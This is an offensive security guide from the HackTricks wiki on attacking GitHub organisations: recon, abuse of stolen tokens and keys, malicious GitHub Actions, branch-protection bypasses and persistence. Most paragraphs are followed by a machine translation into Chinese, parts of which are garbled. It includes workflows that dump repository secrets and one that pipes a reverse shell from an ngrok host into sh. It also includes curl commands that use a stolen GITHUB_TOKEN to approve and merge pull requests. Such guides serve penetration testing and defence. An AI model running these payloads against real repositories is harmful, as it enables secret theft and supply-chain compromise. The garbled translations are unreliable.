

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>


# What is Github

＃什么是github

(From [here](https://kinsta.com/knowledgebase/what-is-github/)) At a high level, **GitHub is a website and cloud-based service that helps developers store and manage their code, as well as track and control changes to their code**.

（来自[here]（https://kinsta.com/knowledgebase/what-is-github/））在高级，** GitHub是一个网站和基于云的服务，可帮助开发人员存储和管理其代码，如 以及跟踪和控制更改其代码**。

## Basic Information

＃＃ 基本信息

{% content-ref url="basic-github-information.md" %}

{％content-ref url =“ basic-github-information.md”％}
[basic-github-information.md](basic-github-information.md)

[basic-github-information.md]（基本github-information.md）
{% endcontent-ref %}

# External Recon

Github repositories can be configured as public, private and internal.

GitHub存储库可以配置为公共，私人和内部。

* **Private** means that **only** people of the **organisation** will be able to access them

***私人**意味着**仅** **组织的人**将能够访问它们
* **Internal** means that **only** people of the **enterprise** (an enterprise may have several organisations) will be able to access it

***内部**意味着**仅** **企业的人**（企业可能有几个组织）将能够访问它
* **Public** means that **all internet** is going to be able to access it.

***公共**意味着**所有互联网**将能够访问它。

In case you know the **user, repo or organisation you want to target** you can use **github dorks** to find sensitive information or search for **sensitive information leaks** **on each repo**.

如果您知道要定位的**用户，回购或组织**，则可以使用** github dorks **找到敏感信息或搜索**敏感信息泄漏** ** ** ** **。

## Github Dorks

## github傻瓜

Github allows to **search for something specifying as scope a user, a repo or an organisation**. Therefore, with a list of strings that are going to appear close to sensitive information you can easily **search for potential sensitive information in your target**.

GitHub允许**搜索指定的内容，将用户，回购或组织** **搜索。 因此，有了一系列将会出现接近敏感信息的字符串列表，您可以轻松地**搜索目标中的潜在敏感信息**。

Tools (each tool contains its list of dorks):

工具（每个工具都包含其傻瓜列表）：

* [https://github.com/obheda12/GitDorker](https://github.com/obheda12/GitDorker) ([Dorks list](https://github.com/obheda12/GitDorker/tree/master/Dorks))
* [https://github.com/techgaun/github-dorks](https://github.com/techgaun/github-dorks) ([Dorks list](https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt))
* [https://github.com/hisxo/gitGraber](https://github.com/hisxo/gitGraber) ([Dorks list](https://github.com/hisxo/gitGraber/tree/master/wordlists))

## Github Leaks

Please, note that the github dorks are also meant to search for leaks using github search options. This section is dedicated to those tools that will **download each repo and search for sensitive information in them** (even checking certain depth of commits).

请注意，GitHub Dorks还旨在使用GitHub搜索选项搜索泄漏。 本节专用于那些将**下载每个存储库并搜索其中的敏感信息的工具（甚至检查某些提交深度）。

Tools (each tool contains its list of regexes):

工具（每个工具都包含其REGEXES列表）：

* [https://github.com/zricethezav/gitleaks](https://github.com/zricethezav/gitleaks)
* [https://github.com/trufflesecurity/truffleHog](https://github.com/trufflesecurity/truffleHog)
* [https://github.com/eth0izzle/shhgit](https://github.com/eth0izzle/shhgit)
* [https://github.com/michenriksen/gitrob](https://github.com/michenriksen/gitrob)
* [https://github.com/anshumanbh/git-all-secrets](https://github.com/anshumanbh/git-all-secrets)
* [https://github.com/kootenpv/gittyleaks](https://github.com/kootenpv/gittyleaks)
* [https://github.com/awslabs/git-secrets](https://github.com/awslabs/git-secrets)

# Internal Recon & Attacks

＃内部侦察和攻击

For this scenario we are going to suppose that you have obtained some access to a github account.

对于这种情况，我们将假设您已经获得了对GitHub帐户的一些访问权限。

## With User Credentials

##带有用户凭据

If you somehow already have credentials for a user inside an organization you can **just login** and check which **enterprise and organization roles you have**, if you are a raw member, check which **permissions raw members have**, in which **groups** you are, which **permissions you have** over which **repos,** and **how are the repos protected.**

如果您以某种方式已经为组织内部的用户具有凭据，您可以**登录**，并检查您拥有**的**企业和组织角色，如果您是RAW成员，请检查** Permissions raw成员拥有* *，其中**组**，您拥有的**权限** ** repos，**和**如何受到保护。**

Note that **2FA may be used** so you will only be able to access this information if you can also **pass that check**.

请注意，** 2FA可以使用**，因此，如果您还可以**通过该检查**，则只能访问此信息。

{% hint style="info" %}

{％提示样式=“ info”％}
Note that if you **manage to steal the `user_session` cookie** (currently configured with SameSite: Lax) you can **completely impersonate the user** without needing credentials or 2FA.

请注意，如果您**设法窃取了`user_session` cookie ** equie ** exece ** cookie **（当前配置了samesite：lax），则可以**完全模仿用户**，而无需凭据或2FA。
{% endhint %}

Check the section below about [**branch protections bypasses**](./#branch-protection-bypass) in case it's useful.

检查下面有关[**分支保护措施绕过**]（./# Branch-protection-bypass）的部分，以防万一很有用。

## With User SSH Key

##使用用户SSH键

Github allows **users** to set **SSH keys** that will be used as **authentication method to deploy code** on their behalf (no 2FA is applied).

github允许**用户**设置** ssh键**，它将用作**身份验证方法来代表他们部署代码**（不应用2FA）。

With this key you can perform **changes in repositories where the user has some privileges**, however you can not user it to access github api to enumerate the environment. However, you can **enumerate local settings** to get information about the repos and user you have access to:

使用此密钥，您可以在用户具有一些特权**的存储库中执行**更改，但是您无法用户访问github api以枚举环境。 但是，您可以**枚举本地设置**，以获取有关您可以访问的存储库和用户的信息：

```bash
# Go to the the repository folder
# Get repo config and current user name and email
git config --list
```

If the user has configured its username as his github username you can access the **public keys he has set** in his account in _https://github.com/\<github\_username>.keys_, you could check this to confirm the private key you found can be used.

如果用户将其用户名配置为他的github用户名，则可以访问他在_https：//github.com/ \ <github \ _username> .keys_中的帐户中设置**的**公共密钥 确认可以使用您发现的私钥。

**SSH keys** can also be set in repositories as **deploy keys**. Anyone with access to this key will be able to **launch projects from a repository**. Usually in a server with different deploy keys the local file **`~/.ssh/config`** will give you info about key is related.

** SSH键**也可以在存储库中设置为**部署键**。 任何可以访问此密钥的人都可以**从存储库**启动项目。 通常在具有不同部署密钥的服务器中，本地文件**〜/.ssh/config` **将为您提供有关密钥的信息。

### GPG Keys

As explained [**here**](basic-github-information.md#ssh-keys) sometimes it's needed to sign the commits or you might get discovered.

正如[**在这里**]（基本github-information.md＃ssh-keys）所解释的，有时需要签署提交，否则您可能会被发现。

Check locally if the current user has any key with:

在本地检查当前用户是否有任何密钥：

```shell
gpg --list-secret-keys --keyid-format=long
```

## With User Token

For an introduction about [**User Tokens check the basic information**](basic-github-information.md#personal-access-tokens).

有关[**用户令牌检查基本信息**]（基本github-information.md＃personal-access-tokens）的介绍。

A user token can be used **instead of a password** for Git over HTTPS, or can be used to [**authenticate to the API over Basic Authentication**](https://docs.github.com/v3/auth/#basic-authentication). Depending on the privileges attached to it you might be able to perform different actions.

可以使用用户令牌**而不是密码**用于通过https的git，也可以用来[**通过基本身份验证**]（https://docs.github.com/v3/）对API进行验证。 auth/＃basic-authentication）。 根据附带的特权，您可能能够执行不同的动作。

A User token looks like this: `ghp_EfHnQFcFHX6fGIu5mpduvRiYR584kK0dX123`

## With Oauth Application

##带有Oauth应用程序

For an introduction about [**Github Oauth Applications check the basic information**](basic-github-information.md#oauth-applications).

有关[** github oauth应用程序的介绍，请检查基本信息**]（基本github-information.md＃oauth-applications）。

An attacker might create a **malicious Oauth Application** to access privileged data/actions of the users that accepts them probably as part of a phishing campaign.

攻击者可能会创建一个恶意的OAuth应用程序**，以访问可能作为网络钓鱼活动的一部分接受用户的特权数据/动作。

These are the [scopes an Oauth application can request](https://docs.github.com/en/developers/apps/building-oauth-apps/scopes-for-oauth-apps). A should always check the scopes requested before accepting them.

这些是[oauth应用程序可以要求的范围]（https://docs.github.com/en/developers/apps/building-oauth-apps/scopes-for-oauth-apps）。 A应始终在接受之前检查所需的范围。

Moreover, as explained in the basic information, **organizations can give/deny access to third party applications** to information/repos/actions related with the organisation.

此外，正如基本信息中所述，**组织可以给/拒绝对第三方应用程序**访问与组织相关的信息/存储/行动。

## With Github Application

##用github应用程序

For an introduction about [**Github Applications check the basic information**](basic-github-information.md#github-applications).

有关[** github应用程序的介绍，请检查基本信息**]（基本github-information.md＃github-applications）。

An attacker might create a **malicious Github Application** to access privileged data/actions of the users that accepts them probably as part of a phishing campaign.

攻击者可能会创建一个恶意的GitHub应用程序**，以访问可能作为网络钓鱼活动的一部分接受用户的特权数据/动作。

Moreover, as explained in the basic information, **organizations can give/deny access to third party applications** to information/repos/actions related with the organisation.

此外，正如基本信息中所述，**组织可以给/拒绝对第三方应用程序**访问与组织相关的信息/存储/行动。

## Enumerate Webhooks

**Webhooks** are able to **send specific gitea information to some places**. You might be able to **exploit that communication**.\

** Webhooks **可以**将特定的Gitea信息发送到某些地方**。 您可能可以**利用该通信**。
However, usually a **secret** you can **not retrieve** is set in the **webhook** that will **prevent** external users that know the URL of the webhook but not the secret to **exploit that webhook**.\

但是，通常一个**秘密**您可以**检索**在** webhook **中设置了** **可以防止**知道Webhook的URL的外部用户，而不是** exploit的秘诀 那个webhook **。\
But in some occasions, people instead of setting the **secret** in its place, they **set it in the URL** as a parameter, so **checking the URLs** could allow you to **find secrets** and other places you could exploit further.

但是在某些情况下，人们没有将**秘密**设置在其位置，而是将其设置在url **中为参数，因此**检查URL **可以让您**找到秘密** *以及您可以进一步利用的其他地方。

Webhooks can be set at **repo and at org level**.

可以在** repo和org级别**设置Webhooks。

## With Malicious Github Action

##用恶意的github动作

For an introduction about [**Github Actions check the basic information**](basic-github-information.md#git-actions).

有关[** github操作的介绍，请检查基本信息**]（基本github-information.md＃git-actions）。

In case you can **execute arbitrary github actions** in a **repository**, you can **steal the secrets from that repo**.

如果您可以**在**存储库中执行任意github操作**，则可以**从该仓库中窃取秘密**。

### Github Action Execution from Repo Creation

### github动作执行回购创建

In case members of an organization can **create new repos** and you can execute github actions, you can **create a new repo and steal the secrets set at organization level**.

如果组织的成员可以**创建新的存储库**，并且您可以执行GitHub操作，则可以**创建一个新的存储库并窃取组织级别的秘密**。

### Github Action from a New Branch

### github动作来自新分支

If you can **create a new branch in a repository that already contains a Github Action** configured, you can **modify** it, **upload** the content, and then **execute that action from the new branch**. This way you can **exfiltrate repository and organization level secrets** (but you need to know how they are called).

如果您可以**在存储库中创建一个新的分支，该分支已经包含一个已配置的github操作**，则可以**修改**，**上传**内容，然后**从新分支执行该操作 **。 这样，您可以**渗透存储库和组织级秘密**（但是您需要知道它们的名称）。

You can make the modified action executable **manually,** when a **PR is created** or when **some code is pushed** (depending on how noisy you want to be):

您可以手动进行修改的操作**，**创建** PR时**或**推动某些代码**（取决于您想成为的嘈杂程度）时：

```yaml
on:
  workflow_dispatch: # Launch manually
  pull_request: #Run it when a PR is created to a branch
    branches:
      - master
  push: # Run it when a push is made to a branch
    branches:
      - current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```

### Github Action Injection/Backdoor

### github动作注入/后门

In case you somehow managed to **infiltrate inside a Github Action**, if you can escalate privileges you can **steal secrets from the processes where secrets have been set in**. In some cases you don't even need to escalate privileges.

如果您以某种方式设法在GitHub动作中渗透了**，如果您可以升级特权，则可以**从设置秘密的过程中窃取秘密。 在某些情况下，您甚至不需要升级特权。

```bash
cat /proc/<proc_number>/environ
cat /proc/*/environ | grep -i secret #Suposing the env variable name contains "secret"
```

### GITHUB\_TOKEN

This "**secret**" (coming from `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`) is given by default read and **write permissions** **to the repo**. This token is the same one a **Github Application will use**, so it can access the same endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

这个“ **秘密**”（来自'$ {{necrets.github_token}}'和'$ {{github.token}}`）'由默认读取和**写入权限** ** ** **。 这个令牌是相同的一个** github应用程序将使用**，因此可以访问相同的端点：[https://docs.github.com/en/rest/rest/overview/endpoints-availpoints-availables-available-for-github-apps ]（https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps）

You can see the possible **permissions** of this token in: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

您可以在：[https：//docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-formissions-for-theub \_token] （https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-formissions-for-the-github \_token）

These tokens looks like this: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Some interesting things you can do with this token:

您可以使用这个令牌来做一些有趣的事情：

```bash
# Merge PR
curl -X PUT \
    https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
    -H "Accept: application/vnd.github.v3+json" \
    --header "authorization: Bearer $GITHUB_TOKEN" \
    --header 'content-type: application/json' \
    -d '{"commit_title":"commit_title"}'

# Approve a PR
curl -X POST \
    https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
    -H "Accept: application/vnd.github.v3+json" \
    --header "authorization: Bearer $GITHUB_TOKEN" \
    --header 'content-type: application/json' \
    -d '{"event":"APPROVE"}'

# Create a PR
curl -X POST \
  -H "Accept: application/vnd.github.v3+json" \
  --header "authorization: Bearer $GITHUB_TOKEN" \
    --header 'content-type: application/json' \
  https://api.github.com/repos/<org_name>/<repo_name>/pulls \
  -d '{"head":"<branch_name>","base":"master", "title":"title"}'
```

{% hint style="danger" %}
Note that in several occasions you will be able to find **github user tokens inside Github Actions envs or in the secrets**. These tokens may give you more privileges over the repository and organization.

请注意，在某些情况下，您将能够在GitHub Actions Envs或Secrets **中找到** github用户令牌。 这些令牌可能会为您提供更多的资源和组织的特权。
{% endhint %}

### List secrets in Github Action output

###在github动作输出中列出秘密

```yaml
name: list_env
on:
  workflow_dispatch: # Launch manually
  pull_request: #Run it when a PR is created to a branch
    branches:
      - '**'
  push: # Run it when a push is made to a branch
    branches:
      - '**'
jobs:     
  List_env:
    runs-on: ubuntu-latest
    steps:
      - name: List Env
        # Need to base64 encode or github will change the secret value for "***"
        run: sh -c 'env | grep "secret_" | base64 -w0'
        env:
          secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
          secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```

### Get reverse shell with secrets

###获得秘密的反向外壳

```yaml
name: revshell
on:
  workflow_dispatch: # Launch manually
  pull_request: #Run it when a PR is created to a branch
    branches:
      - '**'
  push: # Run it when a push is made to a branch
    branches:
      - '**'
jobs:     
  create_pull_request:
    runs-on: ubuntu-latest
    steps:
      - name: Get Rev Shell
        run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
        env:
          secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
          secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```

## Branch Protection Bypass

##分支保护旁路

* **Require a number of approvals**: If you compromised several accounts you might just accept your PRs from other accounts. If you just have the account from where you created the PR you cannot accept your own PR. However, if you have access to a **Github Action** environment inside the repo, using the **GITHUB\_TOKEN** you might be able to **approve your PR** and get 1 approval this way.

***需要多个批准**：如果您妥协了几个帐户，则可能只接受其他帐户中的PR。 如果您只有创建PR的帐户，则无法接受自己的PR。 但是，如果您可以使用** github \ _token **访问存储库中的** github操作**环境。
  * _Note for this and for the Code Owners restriction that usually a user won't be able to approve his own PRs, but if you are, you can abuse it to accept your PRs._

* _ note和代码所有者通常无法批准自己的PRS的代码所有者限制，但是如果您是，则可以滥用它以接受您的PRS。
* **Dismiss approvals when new commits are pushed**: If this isn’t set, you can submit legit code, wait till someone approves it, and put malicious code and merge it into the protected branch.

***解雇新的提交时** **：如果未设置这一点，则可以提交合法代码，等到某人批准，然后将恶意代码合并到受保护的分支机构中。
* **Require reviews from Code Owners**: If this is activated and you are a Code Owner, you could make a **Github Action create your PR and then approve it yourself**.

***需要代码所有者的评论**：如果激活这并且您是代码所有者，则可以做出** github操作创建您的PR，然后自己批准**。
  * When a **CODEOWNER file is missconfigured** Github doesn't complain but it does't use it. Therefore, if it's missconfigured it's **Code Owners protection isn't applied.**

*当一个**编码者文件被错过时** github不会抱怨，但不使用它。 因此，如果被遗忘了，则不会应用**代码所有者保护。**
* **Allow specified actors to bypass pull request requirements**: If you are one of these actors you can bypass pull request protections.

***允许指定的参与者绕过拉请求请求**：如果您是这些参与者之一，则可以绕过拉请求保护。
* **Include administrators**: If this isn’t set and you are admin of the repo, you can bypass this branch protections.

***包括管理员**：如果未设置此设置，并且您是存储库的管理员，则可以绕过此分支保护措施。
* **PR Hijacking**: You could be able to **modify the PR of someone else** adding malicious code, approving the resulting PR yourself and merging everything.

*** PR劫持**：您可以**修改他人的PR **添加恶意代码，批准自己的PR并合并所有内容。
* **Removing Branch Protections**: If you are an **admin of the repo you can disable the protections**, merge your PR and set the protections back.

***删除分支保护措施**：如果您是存储库的管理员，则可以禁用保护措施**，合并您的PR并将保护放回原处。
* **Bypassing push protections**: If a repo **only allows certain users** to send push (merge code) in branches (the branch protection might be protecting all the branches specifying the wildcard `*`).

***绕过推动保护**：如果repo **仅允许某些用户**在分支机构中发送推送（合并代码）（分支保护可能正在保护所有指定通配符``**``）的分支。
  * If you have **write access over the repo but you are not allowed to push code** because of the branch protection, you can still **create a new branch** and within it create a **github action that is triggered when code is pushed**. As the **branch protection won't protect the branch until it's created**, this first code push to the branch will **execute the github action**.

*如果您有**在存储库上写入访问权限，但是由于分支保护而不允许您推动代码**，您仍然可以**创建一个新的分支** 推销代码时**。 由于**分支保护在创建**之前不能保护该分支，因此将第一个代码推向分支，将**执行GitHub Action **。

## Bypass Environments Protections

##旁路环境保护

For an introduction about [**Github Environment check the basic information**](basic-github-information.md#git-environments).

有关[** github环境的介绍，请查看基本信息**]（基本github-information.md＃git-envroncments）。

In case an environment can be **accessed from all the branches**, it's **isn't protected** and you can easily access the secrets inside the environment. Note that you might find repos where **all the branches are protected** (by specifying its names or by using `*`) in that scenario, **find a branch were you can push code** and you can **exfiltrate** the secrets creating a new github action (or modifying one).

如果可以从所有分支**访问环境，则**不受保护**，您可以轻松地访问环境内的秘密。 请注意，您可能会找到**所有分支都受到保护**（通过指定其名称或使用``*``）的回购，在这种情况下，**找到一个分支，如果您可以按代码**，则可以** exflate **秘密创建新的github动作（或修改一个）。

Note, that you might find the edge case where **all the branches are protected** (via wildcard `*`) it's specified **who can push code to the branches** (_you can specify that in the branch protection_) and **your user isn't allowed**. You can still run a custom github action because you can create a branch and use the push trigger over itself. The **branch protection allows the push to a new branch so the github action will be triggered**.

请注意，您可能会发现**所有分支都受到保护**的边缘情况（通过通配符`*`）指定的**可以将代码推到分支** **（_您可以在分支保护中指定）和 **您的用户不允许**。 您仍然可以运行自定义的GitHub操作，因为您可以创建一个分支并使用推动扳机在自身上。 **分支保护允许将其推入新分支，因此将触发github动作**。

```yaml
  push: # Run it when a push is made to a branch
    branches:
      - current_branch_name #Use '**' to run when a push is made to any branch
```

Note that **after the creation** of the branch the **branch protection will apply to the new branch** and you won't be able to modify it, but for that time you will have already dumped the secrets.

请注意，在创建分支机构的创建后，**分支保护将适用于新分支**，您将无法修改它，但是在那个时候，您将已经丢弃了秘密。

# Persistence

＃持久性

* Generate **user token**
* Steal **github tokens** from **secrets**

*窃取** github令牌**从**秘密**
  * **Deletion** of workflow **results** and **branches**&#x20;

***删除**工作流**结果**和**分支** **＆＃x20;
* Give **more permissions to all the org**

*给予**所有组织的权限**
* Create **webhooks** to exfiltrate information

*创建** webhooks **以渗透信息
* Invite **outside collaborators**
* **Remove** **webhooks** used by the **SIEM**

***删除** ** webhooks ** ** Siem **使用
* Create/modify **Github Action** with a **backdoor**

*创建/修改** github Action **使用**后门**
* Find v**ulnerable Github Action to command injection** via **secret** value modification&#x20;

*找到v ** ulnerable github动作以命令注入**通过**秘密**值修改＆＃x20;


<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>


